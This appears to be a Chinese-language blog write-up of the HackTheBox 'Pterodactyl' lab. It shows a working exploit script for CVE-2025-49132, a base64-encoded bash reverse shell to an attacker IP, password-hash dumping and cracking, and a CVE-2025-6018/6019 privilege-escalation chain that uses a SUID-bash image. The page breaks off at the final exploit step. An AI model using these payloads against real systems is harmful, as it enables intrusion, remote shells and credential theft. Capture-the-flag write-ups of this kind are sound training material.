<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="Nmap12345678Nmap scan report for 10.129.23.53Host is up (0.88s latency).Not shown: 65496 filtered tcp ports (no-response), 35 filtered tcp ports (admin-prohibited)PORT     STATE  SERVICE22&#x2F;tcp   open">
<meta property="og:type" content="article">
<meta property="og:title" content="HTB-Pterodactyl">
<meta property="og:url" content="https://thr2on1.github.io/2026/02/14/HTB-Pterodactyl/index.html">
<meta property="og:site_name" content="Thr2on1&#39;s Blog">
<meta property="og:description" content="Nmap12345678Nmap scan report for 10.129.23.53Host is up (0.88s latency).Not shown: 65496 filtered tcp ports (no-response), 35 filtered tcp ports (admin-prohibited)PORT     STATE  SERVICE22&#x2F;tcp   open">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://thr2on1.github.io/2026/02/14/HTB-Pterodactyl/image-20260216152134122.png">
<meta property="og:image" content="https://thr2on1.github.io/2026/02/14/HTB-Pterodactyl/image-20260216153511903.png">
<meta property="article:published_time" content="2026-02-14T03:28:36.000Z">
<meta property="article:modified_time" content="2026-02-16T09:46:00.468Z">
<meta property="article:author" content="Thr2on1">
<meta property="article:tag" content="CVE-2025-49132">
<meta property="article:tag" content="bcrypt">
<meta property="article:tag" content="CVE-2025-6018">
<meta property="article:tag" content="CVE-2025-6019">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://thr2on1.github.io/2026/02/14/HTB-Pterodactyl/image-20260216152134122.png">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>HTB-Pterodactyl</title>
    <!-- async scripts -->
    <!-- Google Analytics -->


    <!-- Umami Analytics -->


    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	
<meta name="generator" content="Hexo 7.3.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a href="/categories/">Category</a></li><!--
     --><!--
       --><li><a href="/tags/">tags</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/search/">Search</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" aria-label="Previous post" href="/2026/02/16/HTB-WingData/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="Next post" href="/2026/02/02/HTB-Facts/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://thr2on1.github.io/2026/02/14/HTB-Pterodactyl/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://thr2on1.github.io/2026/02/14/HTB-Pterodactyl/&text=HTB-Pterodactyl"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://thr2on1.github.io/2026/02/14/HTB-Pterodactyl/&title=HTB-Pterodactyl"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://thr2on1.github.io/2026/02/14/HTB-Pterodactyl/&is_video=false&description=HTB-Pterodactyl"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=HTB-Pterodactyl&body=Check out this article: https://thr2on1.github.io/2026/02/14/HTB-Pterodactyl/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://thr2on1.github.io/2026/02/14/HTB-Pterodactyl/&title=HTB-Pterodactyl"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://thr2on1.github.io/2026/02/14/HTB-Pterodactyl/&title=HTB-Pterodactyl"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://thr2on1.github.io/2026/02/14/HTB-Pterodactyl/&title=HTB-Pterodactyl"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://thr2on1.github.io/2026/02/14/HTB-Pterodactyl/&title=HTB-Pterodactyl"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://thr2on1.github.io/2026/02/14/HTB-Pterodactyl/&name=HTB-Pterodactyl&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://thr2on1.github.io/2026/02/14/HTB-Pterodactyl/&t=HTB-Pterodactyl"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    
    
      <div id="toc">
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Nmap"><span class="toc-number">1.</span> <span class="toc-text">Nmap</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Subdomain"><span class="toc-number">2.</span> <span class="toc-text">Subdomain</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2025-49132"><span class="toc-number">3.</span> <span class="toc-text">CVE-2025-49132</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#USER"><span class="toc-number">4.</span> <span class="toc-text">USER</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ROOT"><span class="toc-number">5.</span> <span class="toc-text">ROOT</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2025-6018"><span class="toc-number">5.1.</span> <span class="toc-text">CVE-2025-6018</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2025-6019"><span class="toc-number">5.2.</span> <span class="toc-text">CVE-2025-6019</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8"><span class="toc-number">5.3.</span> <span class="toc-text">åˆ©ç”¨</span></a></li></ol></li></ol>
      </div>
    
  </span>
</div>

    
    <div class="content index py4 ">
        
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle p-name" itemprop="name headline">
        HTB-Pterodactyl
    </h1>



    <div class="meta">
      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span class="p-name" itemprop="name">Thr2on1</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2026-02-14T03:28:36.000Z" class="dt-published" itemprop="datePublished">2026-02-14</time>
        
      
    </div>


      
    <div class="article-category">
        <i class="fa-solid fa-archive"></i>
        <a class="category-link" href="/categories/HackTheBox/">HackTheBox</a>
    </div>


      
    <div class="article-tag">
        <i class="fa-solid fa-tag"></i>
        <a class="p-category" href="/tags/CVE-2025-49132/" rel="tag">CVE-2025-49132</a>, <a class="p-category" href="/tags/CVE-2025-6018/" rel="tag">CVE-2025-6018</a>, <a class="p-category" href="/tags/CVE-2025-6019/" rel="tag">CVE-2025-6019</a>, <a class="p-category" href="/tags/bcrypt/" rel="tag">bcrypt</a>
    </div>


    </div>
  </header>
  

  <div class="content e-content" itemprop="articleBody">
    <h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Nmap scan report <span class="keyword">for</span> 10.129.23.53</span><br><span class="line">Host is up (0.88s latency).</span><br><span class="line">Not shown: 65496 filtered tcp ports (no-response), 35 filtered tcp ports (admin-prohibited)</span><br><span class="line">PORT     STATE  SERVICE</span><br><span class="line">22/tcp   open   ssh</span><br><span class="line">80/tcp   open   http</span><br><span class="line">443/tcp  closed https</span><br><span class="line">8080/tcp closed http-proxy</span><br></pre></td></tr></table></figure>

<p>å…ˆçœ‹80ç«¯å£ï¼ŒæŸ¥çœ‹changelog.txt</p>
<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[Installed] Pterodactyl Panel v1.11.10</span><br><span class="line">--------------------------------------</span><br><span class="line">- Installed Pterodactyl Panel.</span><br><span class="line">- Configured environment:</span><br><span class="line">  - PHP with required extensions.</span><br><span class="line">  - MariaDB 11.8.3 backend.</span><br><span class="line">  </span><br><span class="line">[Enhanced] PHP Capabilities</span><br><span class="line">-------------------------------------</span><br><span class="line">- Enabled PHP-FPM for smoother website handling on all domains.</span><br><span class="line">- Enabled PHP-PEAR for PHP package management.</span><br><span class="line">- Added temporary PHP debugging via phpinfo()</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹åˆ°ï¼Œè¯¥é¶æœºå®‰è£…äº†Pterodactylé¢æ¿ç‰ˆæœ¬å·ä¸º<code>v1.11.10</code>ä¸”å®‰è£…äº†<code>PHP-PEAR</code>ï¼Œä»¥åŠå­˜åœ¨ä¸€ä¸ªphpinfo.phpé¡µé¢ã€‚</p>
<h2 id="Subdomain"><a href="#Subdomain" class="headerlink" title="Subdomain"></a>Subdomain</h2><p>ä½¿ç”¨ffufå·¥å…·è¿›è¡Œå­åŸŸåæ”¶é›†</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(kaliğŸ‘»Thr2on1)-[~/Websec/HTB/Pterodactyl]</span><br><span class="line">â””â”€$ ffuf -u http://pterodactyl.htb -H <span class="string">&quot;Host: FUZZ.pterodactyl.htb&quot;</span> -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -ac</span><br><span class="line"></span><br><span class="line">        /<span class="string">&#x27;___\  /&#x27;</span>___\           /<span class="string">&#x27;___\       </span></span><br><span class="line"><span class="string">       /\ \__/ /\ \__/  __  __  /\ \__/       </span></span><br><span class="line"><span class="string">       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      </span></span><br><span class="line"><span class="string">        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      </span></span><br><span class="line"><span class="string">         \ \_\   \ \_\  \ \____/  \ \_\       </span></span><br><span class="line"><span class="string">          \/_/    \/_/   \/___/    \/_/       </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">       v2.1.0-dev</span></span><br><span class="line"><span class="string">________________________________________________</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> :: Method           : GET</span></span><br><span class="line"><span class="string"> :: URL              : http://pterodactyl.htb</span></span><br><span class="line"><span class="string"> :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt</span></span><br><span class="line"><span class="string"> :: Header           : Host: FUZZ.pterodactyl.htb</span></span><br><span class="line"><span class="string"> :: Follow redirects : false</span></span><br><span class="line"><span class="string"> :: Calibration      : true</span></span><br><span class="line"><span class="string"> :: Timeout          : 10</span></span><br><span class="line"><span class="string"> :: Threads          : 40</span></span><br><span class="line"><span class="string"> :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500</span></span><br><span class="line"><span class="string">________________________________________________</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">panel                   [Status: 200, Size: 1897, Words: 490, Lines: 36, Duration: 621ms]</span></span><br></pre></td></tr></table></figure>

<p>æ‰«å‡ºæ¥ä¸€ä¸ªpanel.pterodactyl.htbï¼Œè®¿é—®åæ˜¯ç¿¼é¾™é¢æ¿çš„ç™»å½•é¡µé¢ã€‚</p>
<h2 id="CVE-2025-49132"><a href="#CVE-2025-49132" class="headerlink" title="CVE-2025-49132"></a>CVE-2025-49132</h2><p>åœ¨Googleä¸Šæœç´¢pterodactylçš„CVEï¼Œæ‰¾åˆ°CVE-2025-49132 RCEæ¼æ´ï¼ˆæ¼æ´ç‰ˆæœ¬ï¼šversion &lt; 1.11.1ï¼‰æ–‡ä»¶åŒ…å«æœ¬åœ°çš„pearcmd.phpä»è€Œå‘½ä»¤æ‰§è¡Œã€‚ä¸‹è½½expï¼ˆ<a target="_blank" rel="noopener" href="https://github.com/0xtensho/CVE-2025-49132-poc%EF%BC%89">https://github.com/0xtensho/CVE-2025-49132-pocï¼‰</a><br>é€šè¿‡phpinfo.phpå¯ä»¥å¾—åˆ°pearcmd.phpåœ¨æœåŠ¡å™¨ä¸Šçš„ä½ç½®ï¼Œå¹¶æ›¿æ¢expä¸­çš„è·¯å¾„</p>
<p><img src="image-20260216152134122.png" alt="image-20260216152134122"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys, os</span><br><span class="line"></span><br><span class="line">host=sys.argv[<span class="number">1</span>]</span><br><span class="line">payload=sys.argv[<span class="number">2</span>].replace(<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;\\$\\\\&#123;IFS\\\\&#125;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Ugly but have to use curl since the package requests won&#x27;t allow us to send characters like &#x27;&#123;&#x27; without encoding them</span></span><br><span class="line">os.system(<span class="string">f&quot;curl \&quot;http://<span class="subst">&#123;host&#125;</span>/locales/locale.json?+config-create+/&amp;locale=../../../../../usr/share/php/PEAR&amp;namespace=pearcmd&amp;/&lt;?=system(&#x27;<span class="subst">&#123;payload&#125;</span>&#x27;);die();?&gt;+/tmp/payload.php\&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">os.system(<span class="string">f&quot;curl \&quot;http://<span class="subst">&#123;host&#125;</span>/locales/locale.json?locale=../../../../../tmp&amp;namespace=payload\&quot;&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>ç„¶ååˆ©ç”¨è„šæœ¬è¿›è¡Œåå¼¹shellï¼Œåˆ©ç”¨è¯¥è„šæœ¬åå¼¹shellçš„æ—¶å€™éœ€è¦æ³¨æ„base64å­—ç¬¦ä¸²ä¸­ä¸èƒ½å‡ºç°<code>+</code>å·ï¼Œå¯ä»¥åœ¨payloadé‡ŒåŠ ä¸Šé€‚é‡çš„ç©ºæ ¼ç›´åˆ°base64encodeåçš„å­—ç¬¦ä¸²ä¸­ä¸å­˜åœ¨<code>+</code>å·ã€‚<img src="image-20260216153511903.png" alt="image-20260216153511903"></p>
<p>ç›‘å¬æœ¬åœ°4444ç«¯å£ï¼Œæ‰§è¡Œåå¼¹shellè„šæœ¬</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(kaliğŸ‘»Thr2on1)-[~/Websec/HTB/Pterodactyl/CVE-2025-49132-poc]</span><br><span class="line">â””â”€$ python3 poc.py panel.pterodactyl.htb <span class="string">&quot;echo YmFzaCAtaSAgPiYgL2Rldi90Y3AvMTAuMTAuMTYuOTAvNDQ0NCAwPiYx | base64 -d|bash&quot;</span> </span><br></pre></td></tr></table></figure>

<h2 id="USER"><a href="#USER" class="headerlink" title="USER"></a>USER</h2><p>é¶æœºç¯å¢ƒä¸­æœ‰pythonï¼Œå…ˆæå‡ä¸€ä¸‹shellçš„äº¤äº’æ€§</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br></pre></td></tr></table></figure>

<p>æŸ¥çœ‹<code>/etc/passwd</code>æ–‡ä»¶ï¼Œæ‰¾åˆ°ä¸¤ä¸ªå¯ç™»å½•çš„ç”¨æˆ·</p>
<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">headmonitor:x:1001:100::/home/headmonitor:/bin/bash</span><br><span class="line">phileasfogg3:x:1002:100::/home/phileasfogg3:/bin/bash</span><br></pre></td></tr></table></figure>

<p>åœ¨ç¯å¢ƒå˜é‡ä¸­å¯ä»¥æ‰¾åˆ°MariaDBæ•°æ®åº“çš„ç›¸å…³ä¿¡æ¯</p>
<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">DB_PASSWORD=PteraPanel</span><br><span class="line">DB_USERNAME=pterodactyl</span><br><span class="line">DB_CONNECTION=mysql</span><br><span class="line">DB_DATABASE=panel</span><br></pre></td></tr></table></figure>

<p>è¿æ¥æ•°æ®åº“</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -h 127.0.0.1 -u pterodactyl -pPteraPanel -D panel</span><br></pre></td></tr></table></figure>

<p>åœ¨<code>users</code>è¡¨ä¸­æœ‰ä¸¤æ¡ç”¨æˆ·æ•°æ®</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">MariaDB [panel]&gt; sselect * from <span class="built_in">users</span>;</span><br><span class="line"><span class="keyword">select</span> * from <span class="built_in">users</span>;</span><br><span class="line">+----+-------------+--------------------------------------+--------------+------------------------------+------------+-----------+--------------------------------------------------------------+--------------------------------------------------------------+----------+------------+----------+-------------+-----------------------+----------+---------------------+---------------------+</span><br><span class="line">| <span class="built_in">id</span> | external_id | uuid                                 | username     | email                        | name_first | name_last | password                                                     | remember_token                                               | language | root_admin | use_totp | totp_secret | totp_authenticated_at | gravatar | created_at          | updated_at          |</span><br><span class="line">+----+-------------+--------------------------------------+--------------+------------------------------+------------+-----------+--------------------------------------------------------------+--------------------------------------------------------------+----------+------------+----------+-------------+-----------------------+----------+---------------------+---------------------+</span><br><span class="line">|  2 | NULL        | 5e6d956e-7be9-41ec-8016-45e434de8420 | headmonitor  | headmonitor@pterodactyl.htb  | Head       | Monitor   | $2y$10<span class="variable">$3WJht3</span>/5GOQmOXdljPbAJet2C6tHP4QoORy1PSj59qJrU0gdX5gD2 | OL0dNy1nehBYdx9gQ5CT3SxDUQtDNrs02VnNesGOObatMGzKvTJAaO0B1zNU | en       |          1 |        0 | NULL        | NULL                  |        1 | 2025-09-16 17:15:41 | 2025-09-16 17:15:41 |</span><br><span class="line">|  3 | NULL        | ac7ba5c2-6fd8-4600-aeb6-f15a3906982b | phileasfogg3 | phileasfogg3@pterodactyl.htb | Phileas    | Fogg      | $2y$10<span class="variable">$PwO0TBZA8hLB6nuSsxRqoOuXuGi3I4AVVN2IgE7mZJLzky1vGC9Pi</span> | 6XGbHcVLLV9fyVwNkqoMHDqTQ2kQlnSvKimHtUDEFvo4SjurzlqoroUgXdn8 | en       |          0 |        0 | NULL        | NULL                  |        1 | 2025-09-16 19:44:19 | 2025-11-07 18:28:50 |</span><br><span class="line">+----+-------------+--------------------------------------+--------------+------------------------------+------------+-----------+--------------------------------------------------------------+--------------------------------------------------------------+----------+------------+----------+-------------+-----------------------+----------+---------------------+---------------------+</span><br><span class="line">2 rows <span class="keyword">in</span> <span class="built_in">set</span> (0.001 sec)</span><br></pre></td></tr></table></figure>

<p>å°†ä¸¤ä¸ªç”¨æˆ·çš„hashä¿å­˜ä¸ºpass.hashï¼Œç„¶åä½¿ç”¨johnçˆ†ç ´å¯†ç </p>
<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">headmonitor:$2y$10$3WJht3/5GOQmOXdljPbAJet2C6tHP4QoORy1PSj59qJrU0gdX5gD2</span><br><span class="line">phileasfogg3:$2y$10$PwO0TBZA8hLB6nuSsxRqoOuXuGi3I4AVVN2IgE7mZJLzky1vGC9Pi</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">john pass.hash --wordlist=/usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure>

<p>å¾—åˆ°phileasfogg3çš„å¯†ç ä¸º<code>!QAZ2wsx</code></p>
<h2 id="ROOT"><a href="#ROOT" class="headerlink" title="ROOT"></a>ROOT</h2><p>åœ¨<code>/var/mail/</code>ç›®å½•ä¸‹å¯ä»¥è·å–phileasfogg3é‚®ç®±ä¸­çš„å†…å®¹ï¼Œè¿™é‡Œç»™å‡ºäº†æç¤ºè¦åˆ©ç”¨udisksæ¥è¿›è¡Œææƒ</p>
<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Attention all users,</span><br><span class="line"></span><br><span class="line">Unusual activity has been observed from the udisks daemon (udisksd). No confirmed compromise at this time, but increased vigilance is required.</span><br><span class="line"></span><br><span class="line">Do not connect untrusted external media. Review your sessions for suspicious activity. Administrators should review udisks and system logs and apply pending updates.</span><br><span class="line"></span><br><span class="line">Report any signs of compromise immediately to headmonitor@pterodactyl.htb</span><br><span class="line"></span><br><span class="line">â€” HeadMonitor</span><br><span class="line">System Administrator</span><br></pre></td></tr></table></figure>

<p>æœåˆ°ä¸€ä¸ªææƒåˆ©ç”¨é“¾ï¼ˆ<a target="_blank" rel="noopener" href="https://www.secrss.com/articles/80016%EF%BC%89CVE-2025-6018%E3%80%81CVE-2025-6019">https://www.secrss.com/articles/80016ï¼‰CVE-2025-6018ã€CVE-2025-6019</a></p>
<h3 id="CVE-2025-6018"><a href="#CVE-2025-6018" class="headerlink" title="CVE-2025-6018"></a>CVE-2025-6018</h3><p>è¯¥æ¼æ´å…è®¸è¿œç¨‹éç‰¹æƒæ”»å‡»è€…å¼ºåˆ¶pam_envæ¨¡å—å°†ä»»æ„å˜é‡æ·»åŠ åˆ° PAM çš„ç¯å¢ƒä¸­ï¼Œä»¥è·å– polkit ç­–ç•¥çš„â€œallow_activeâ€è®¤è¯ï¼Œä»è€Œè·å¾—æœ¬åœ°ç”¨æˆ·æƒé™(å¯æ‰§è¡Œå…³æœºã€è®¿é—®æ•æ„Ÿæ¥å£ç­‰æ“ä½œ)</p>
<h3 id="CVE-2025-6019"><a href="#CVE-2025-6019" class="headerlink" title="CVE-2025-6019"></a>CVE-2025-6019</h3><p>è¯¥æ¼æ´æºäºudiskså®ˆæŠ¤è¿›ç¨‹æŒ‚è½½æ–‡ä»¶ç³»ç»Ÿä¸­ä¼šè°ƒç”¨libblockdevåº“ï¼Œè€ŒlibblockdevæŒ‚è½½æ—¶æ²¡æœ‰ä½¿ç”¨ nosuid å’Œ nodev æ ‡å¿—ï¼Œè‡´ä½¿æ‹¥æœ‰â€œallow_activeâ€æƒé™çš„ç”¨æˆ·å¯åˆ©ç”¨æ­¤æ¼æ´è·å– root æƒé™</p>
<h3 id="åˆ©ç”¨"><a href="#åˆ©ç”¨" class="headerlink" title="åˆ©ç”¨"></a>åˆ©ç”¨</h3><p>åœ¨githubä¸‹è½½expï¼ˆ<a target="_blank" rel="noopener" href="https://github.com/muyuanlove/CVE-2025-6018-CVE-2025-6019-Privilege-Escalation-Exploit%EF%BC%89">https://github.com/muyuanlove/CVE-2025-6018-CVE-2025-6019-Privilege-Escalation-Exploitï¼‰</a></p>
<p><strong>0x01 åˆ¶ä½œæ¶æ„é•œåƒæ–‡ä»¶</strong></p>
<p>åœ¨æ”»å‡»æœºä¸Šä¾æ¬¡æ‰§è¡Œä»¥ä¸‹å‘½ä»¤</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Create 300MB XFS image</span></span><br><span class="line"><span class="built_in">dd</span> <span class="keyword">if</span>=/dev/zero of=xfs.image bs=1M count=300</span><br><span class="line">mkfs.xfs -f xfs.image</span><br><span class="line"></span><br><span class="line"><span class="comment"># Mount and install SUID bash</span></span><br><span class="line"><span class="built_in">mkdir</span> mnt</span><br><span class="line"><span class="built_in">sudo</span> mount -t xfs xfs.image mnt</span><br><span class="line"><span class="built_in">sudo</span> <span class="built_in">cp</span> /bin/bash mnt/bash</span><br><span class="line"><span class="built_in">sudo</span> <span class="built_in">chmod</span> 4755 mnt/bash</span><br><span class="line"><span class="built_in">sudo</span> umount mnt</span><br><span class="line"><span class="built_in">rmdir</span> mnt</span><br></pre></td></tr></table></figure>

<p>åˆ›å»ºå®Œæˆåå°†é•œåƒæ–‡ä»¶ä¸Šä¼ è‡³é¶æœº</p>
<p><strong>0x02 åˆ©ç”¨CVE-2025-6018</strong></p>
<p>åœ¨é¶æœºä¸Šé…ç½®PAM</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> &gt; ~/.pam_environment &lt;&lt; <span class="string">&#x27;EOF&#x27;</span></span><br><span class="line">XDG_SEAT OVERRIDE=seat0</span><br><span class="line">XDG_VTNR OVERRIDE=1</span><br><span class="line">EOF</span><br></pre></td></tr></table></figure>

<p>é…ç½®å®Œæˆåé€€å‡ºï¼Œé‡æ–°ç™»é™†</p>
<p><strong>0x03 åˆ©ç”¨CVE-2025-6019</strong></p>
<p>é‡æ–°ä½¿ç”¨sshç™»å½•åï¼Œå°†<code>exp.sh</code>ï¼ˆgithubä¸‹è½½çš„ï¼‰ä¸Šä¼ è‡³é¶æœºï¼Œç„¶åæ‰§è¡Œ</p>
